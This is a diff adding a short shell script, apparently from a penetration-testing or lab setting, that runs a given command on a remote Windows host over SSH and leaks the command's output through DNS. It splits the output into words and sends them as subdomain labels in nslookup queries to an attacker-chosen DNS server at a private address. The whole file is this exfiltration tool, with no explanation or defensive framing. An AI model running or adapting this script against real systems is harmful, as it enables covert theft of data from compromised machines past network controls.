@@ -1,0 +1,10 @@
+#!/bin/sh
+
+cmd=$1
+dns="10.66.10.201"
+tgt="10.66.10.56"
+
+sendCmd="( FOR /F \"tokens=1-26\" %a IN ('${cmd}') DO ( nslookup D%a.D%b.D%c.D%d.D%e.D%f.D%g.D%h.D%i.D%j.D%k.D%l.D%m.D%n.D%o.D%p.D%q.D%r.D%s.D%t.D%u.D%v.D%w.D%x.D%y.D%z. $dns) )"
+
+echo $sendCmd | ssh m0noc@$tgt > /dev/null 2>&1
+echo
